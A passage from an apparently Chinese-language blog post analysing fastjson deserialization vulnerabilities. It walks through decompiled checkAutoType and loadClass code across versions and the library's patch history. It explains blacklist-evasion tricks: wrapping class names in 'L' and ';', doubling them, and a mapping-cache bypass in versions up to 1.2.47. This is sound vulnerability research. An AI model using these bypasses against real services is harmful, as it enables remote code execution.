parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject
parseObject反序列化:&#123;&quot;name&quot;:&quot;z33&quot;,&quot;flag&quot;:true,&quot;age&quot;:20,&quot;sex&quot;:&quot;boy&quot;&#125;
-----------------------------------------------

JSON.parseObject(serializedStr, Object.class)：
call User default Constructor
call User setName
call User setAge
call User setFlag
parseObject反序列化对象名称:org.z33.test.User
parseObject反序列化:User&#123;name=&#39;z33&#39;, age=20, flag=true, sex=&#39;boy&#39;, address=&#39;null&#39;&#125;
-----------------------------------------------

JSON.parseObject(serializedStr, User.class)：
call User default Constructor
call User setName
call User setAge
call User setFlag
parseObject反序列化对象名称:org.z33.test.User
parseObject反序列化:User&#123;name=&#39;z33&#39;, age=20, flag=true, sex=&#39;boy&#39;, address=&#39;null&#39;&#125;
-----------------------------------------------
</code></pre>
<p>除未指定类的parseObject外均解析至User类，且调用了默认构造函数和setter，表现均与之前未指定@type但在parseObject中指定类一致，parseObject函数在指定类后，反序列化的结果类必须是指定类或其子类，否则会抛出异常（再外面套一层就能在抛出异常前完成反序列化操作，大概是因为先实例化filed再赋值给最外层对象吧？）<br>而在<code>JSON.parseObject(serializedStr)</code>中虽然返回值为JSONObject，但还额外调用了getter函数，这是因为不指定类的parseObject其实是这样子的</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> JSONObject <span class="token function">parseObject</span><span class="token punctuation">(</span>String text<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        Object obj <span class="token operator">=</span> <span class="token function">parse</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> obj <span class="token keyword">instanceof</span> <span class="token class-name">JSONObject</span> <span class="token operator">?</span> <span class="token punctuation">(</span>JSONObject<span class="token punctuation">)</span>obj <span class="token operator">:</span> <span class="token punctuation">(</span>JSONObject<span class="token punctuation">)</span><span class="token function">toJSON</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>就是在parse后面加了一个toJSON，而这个toJSON函数在最后又调用实例化的User对象的getter函数给JSONObject赋值</p>
<pre class=" language-java"><code class="language-java">List<span class="token operator">&lt;</span>FieldInfo<span class="token operator">></span> getters <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">computeGetters</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span> <span class="token punctuation">(</span>JSONType<span class="token punctuation">)</span>clazz<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>JSONType<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>Map<span class="token punctuation">)</span>null<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
JSONObject json <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span>getters<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Iterator var5 <span class="token operator">=</span> getters<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">while</span><span class="token punctuation">(</span>var5<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    FieldInfo field <span class="token operator">=</span> <span class="token punctuation">(</span>FieldInfo<span class="token punctuation">)</span>var5<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    value <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>javaObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
    jsonValue <span class="token operator">=</span> <span class="token function">toJSON</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    json<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>field<span class="token punctuation">.</span>name<span class="token punctuation">,</span> jsonValue<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>fastjson反序列化的攻击点就在反序列化时对构造函数以及setter，getter的调用，即上述任意调用方式均可能造成反序列化漏洞</strong></p>
<h2 id="各版本漏洞及补丁"><a href="#各版本漏洞及补丁" class="headerlink" title="各版本漏洞及补丁"></a>各版本漏洞及补丁</h2><h3 id="1-2-25关闭autotype"><a href="#1-2-25关闭autotype" class="headerlink" title="1.2.25关闭autotype"></a>1.2.25关闭autotype</h3><p>更改pom.xml中的版本，代码不变，此时autotype已经被默认关闭，所以反序列化失败</p>
<p>整个autotype的检验就这段函数，第一个参数是类名，第二个参数是预期被反序列化的类（这个参数和1.2.68的一个关键绕过有关）</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">checkAutoType</span><span class="token punctuation">(</span>String typeName<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> expectClass<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">// 检测name是否为null</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> null<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            String className <span class="token operator">=</span> typeName<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">// 如果开了autoType</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport <span class="token operator">||</span> expectClass <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">int</span> i<span class="token punctuation">;</span>
                String deny<span class="token punctuation">;</span>
                <span class="token comment" spellcheck="true">// 检测name是否在白名单中，是则直接load</span>
                <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>acceptList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    deny <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>acceptList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>deny<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">return</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token comment" spellcheck="true">// 检测类是否在黑名单中，在黑名单中抛出异常</span>
                <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>denyList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    deny <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>denyList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>deny<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token comment" spellcheck="true">// 从已存在的两个map中获取class</span>
            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                clazz <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>deserializers<span class="token punctuation">.</span><span class="token function">findClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment" spellcheck="true">// 能从map中找到</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token comment" spellcheck="true">// 没开autotype</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    String accept<span class="token punctuation">;</span>
                    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
                    <span class="token comment" spellcheck="true">// 查一遍黑名单，在黑名单就抛出异常</span>
                    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>denyList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        accept <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>denyList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>accept<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                    <span class="token comment" spellcheck="true">// 查一遍白名单，在白名单内就加载</span>
                    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>acceptList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        accept <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>acceptList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>accept<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token comment" spellcheck="true">// 如果加载出来的类和预期类不一致则抛出异常</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token punctuation">}</span>

                            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token comment" spellcheck="true">// 开了autotype，或者指定了反序列化类，直接进行加载(绝大多数都是从这进好像)</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport <span class="token operator">||</span> expectClass <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token comment" spellcheck="true">// 黑名单过滤，后续还加了Rowset以防止JNDI注入</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>ClassLoader<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span> <span class="token operator">||</span> DataSource<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>

                    <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>

                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token comment" spellcheck="true">// 没开autotype，抛出异常</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>具体见注释</p>
<p>总的来说，步骤如下<br>如果开了autotype，先过白名单，在白名单中直接加载，再过黑名单<br>然后从缓存map和默认运行反序列化的基本类中去找，找得到就看目标类和预期类是否相同，相同即加载并返回<br>然后如果没开autotype，就又过一遍黑名单再过一遍白名单，在白名单中就看目标类和预期类是否相同，相同即加载并返回；<br>最后再看一眼开没开autotype，如果开了就加载，然后检查一下类是不是继承ClassLoader,DataSource之类的危险类，以及是否与期望类一致，都过了就返回（后面补充了RowSet这个类把之前提到的JdbcRowSetImpl给干掉了）<br>最后对所有没开autotype的情况抛出异常</p>
<p>这个autotype的关闭的防御几乎是超级防御了，理论上只有白名单中的类和map中存在且不再黑名单中的类和this.deserializers中定义的基本类可以被加载<br>从代码里可以看到，map中类的反序列化是不受autotype影响的，<code>TypeUtils.getClassFromMapping</code>是设计用于优化之前加载过的类的加载的，而<code>this.deserializers</code>则存放了一些常用的安全类，设计用来对常用类不需要autotype也能自动加载<br>最后也导致这里出现了一个非常严重的反序列化漏洞</p>
<h3 id="黑名单绕过和修复"><a href="#黑名单绕过和修复" class="headerlink" title="黑名单绕过和修复"></a>黑名单绕过和修复</h3><p>起初，在checkAutoType中的安全检查中，黑名单是以字符串的形式存在的，并且检测的方式是startWith，而在紧随其后的<code>TypeUtils.loadClass(typeName, this.defaultClassLoader);</code>中，却又对类名进行了额外处理，来了一手字符串截取，这样子将类名前面套一个<code>L</code>，后面补一个<code>;</code>就能绕过所有的黑名单检测</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">loadClass</span><span class="token punctuation">(</span>String className<span class="token punctuation">,</span> ClassLoader classLoader<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>className <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clazz <span class="token operator">=</span> <span class="token punctuation">(</span>Class<span class="token punctuation">)</span>mappings<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                <span class="token comment" spellcheck="true">// 这段，绕过ClassName开头是[或者L，截取一下</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'['</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> componentType <span class="token operator">=</span> <span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>componentType<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> className<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                String newClassName <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token function">loadClass</span><span class="token punctuation">(</span>newClassName<span class="token punctuation">,</span> classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>classLoader <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        clazz <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        mappings<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var6<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    var6<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    ClassLoader contextClassLoader <span class="token operator">=</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>contextClassLoader <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> contextClassLoader <span class="token operator">!=</span> classLoader<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        clazz <span class="token operator">=</span> contextClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        mappings<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    clazz <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    mappings<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> null<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>修复方案先是当类名以<code>L</code>开头，<code>;</code>结尾时，就把头尾的第一个字符去掉（双写就又绕了），后来又再检测了以<code>LL</code>开头就直接抛出异常，并且同样处理了<code>[</code>（但实际上如果硬塞方括号的话会因为json解析错误直接崩盘，但是在有一篇参考文章的评论区有奇怪的json能绕，可能是fastjson自己的解析问题），黑名单绕过就没得了，并且后来还将黑名单从字符串换成了hashcode，那就更没辙了，甚至都不知道黑名单的内容都是些啥<br>这里有一个仓库记录了黑名单hash对应的包<br><a href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson-blacklist</a><br>且这里的黑名单绕过是在autotype开启的情况下才能进行（略微鸡肋，还是那个map超级绕过比较牛逼）</p>
<h3 id="lt-x3D-1-2-47超级漏洞"><a href="#lt-x3D-1-2-47超级漏洞" class="headerlink" title="&lt;&#x3D;1.2.47超级漏洞"></a>&lt;&#x3D;1.2.47超级漏洞</h3><p>看了下1.2.47的checkAutoType，就是把<code>[L;</code>之类的过滤变成了各种异或之类的算哈希，让人不能一眼看出来过滤了啥，黑名单也变成了算哈希，就需要暴力跑才能知道黑名单又过滤了啥了，但实际上还是和之前的逻辑一致</p>
<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">checkAutoType</span><span class="token punctuation">(</span>String typeName<span class="token punctuation">,</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> expectClass<span class="token punctuation">,</span> <span class="token keyword">int</span> features<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> null<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>typeName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">128</span> <span class="token operator">&amp;&amp;</span> typeName<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            String className <span class="token operator">=</span> typeName<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clazz <span class="token operator">=</span> null<span class="token punctuation">;</span>
            <span class="token keyword">long</span> BASIC <span class="token operator">=</span> <span class="token operator">-</span>3750763034362895579L<span class="token punctuation">;</span>
            <span class="token keyword">long</span> PRIME <span class="token operator">=</span> 1099511628211L<span class="token punctuation">;</span>
            <span class="token keyword">long</span> h1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span>3750763034362895579L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>h1 <span class="token operator">==</span> <span class="token operator">-</span>5808493101479473382L<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
